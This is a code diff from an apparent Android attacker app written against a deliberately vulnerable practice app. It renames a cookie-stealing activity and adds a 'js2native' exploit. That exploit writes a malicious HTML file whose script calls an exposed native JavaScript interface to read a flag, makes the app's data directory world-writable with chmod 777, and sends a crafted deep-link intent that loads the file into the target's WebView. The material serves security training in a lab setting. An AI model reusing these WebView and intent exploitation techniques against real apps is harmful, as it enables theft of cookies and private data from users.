@@ -1,4 +1,4 @@
-package com.forgo7ten.attackapp.attack.sameorigin_policy_bypass
+package com.forgo7ten.attackapp.attack.webview
 
 import android.content.Intent
 import android.os.Bundle
@@ -7,23 +7,23 @@ import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.net.toUri
 import com.forgo7ten.attackapp.ConstValue
-import com.forgo7ten.attackapp.databinding.ActivityStealCookieBinding
+import com.forgo7ten.attackapp.databinding.ActivityWebviewAttackBinding
 import java.io.File
 
-class StealCookieActivity : AppCompatActivity() {
+class WebviewAttackActivity : AppCompatActivity() {
     companion object {
-        private const val TAG = "StealCookieActivity"
+        private const val TAG = "WebviewAttackActivity"
     }
 
-    private lateinit var binding: ActivityStealCookieBinding
+    private lateinit var binding: ActivityWebviewAttackBinding
 
     private lateinit var htmlFile: File
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        binding = ActivityStealCookieBinding.inflate(layoutInflater).apply {
+        binding = ActivityWebviewAttackBinding.inflate(layoutInflater).apply {
             setContentView(root)
         }
-        htmlFile = File(dataDir, "steal_cookie.html")
+        htmlFile = File(dataDir, "evil.html")
         Log.d(TAG, "onCreate: htmlFile=${htmlFile.absolutePath}")
         binding.btnAppcloneAttack.setOnClickListener {
             appcloneAttack()
@@ -31,6 +31,44 @@ class StealCookieActivity : AppCompatActivity() {
         binding.btnContaminatedCookieAttack.setOnClickListener {
             contaminatedCookieAttack()
         }
+        binding.btnJs2nativeAttack.setOnClickListener {
+            js2nativeAttack()
+        }
+    }
+
+    private fun js2nativeAttack() {
+        createJs2nativeHtml()
+        sendEvilIntent("js2native")
+    }
+
+    private fun createJs2nativeHtml() {
+        val js2nativeHtml = """
+            <!DOCTYPE html>
+            <html lang="en">
+                <head>
+                    <meta charset="UTF-8" />
+                    <title>js2native</title>
+                </head>
+                <body>
+                    <h1>js2native</h1>
+                </body>
+                <script type="text/javascript">
+                    console.log("js2native")
+                    var flag = "js2native,flag: "+info.getFlag()
+                    console.log(flag)
+                    document.body.appendChild(document.createTextNode(flag));
+                    alert(flag)
+                </script>
+            </html>
+            
+        """.trimIndent()
+        if (htmlFile.exists()) {
+            htmlFile.delete()
+        }
+        htmlFile.createNewFile()
+        htmlFile.writeText(js2nativeHtml)
+
+        exec("chmod -R 777 ${htmlFile.parent}")
     }
 
     private fun contaminatedCookieAttack() {
@@ -144,7 +182,7 @@ class StealCookieActivity : AppCompatActivity() {
 
     private fun sendEvilIntent(path: String) {
         val uriStr =
-            "fvulnerable://forgo7ten.github.io/sameorigin_policy_bypass/$path?url=file://${htmlFile.absolutePath}"
+            "fvulnerable://forgo7ten.github.io/webview_vulnerability/$path?url=file://${htmlFile.absolutePath}"
         Log.d(TAG, "sendEvilIntent: uriStr=$uriStr")
         Intent().apply {
             action = Intent.ACTION_VIEW
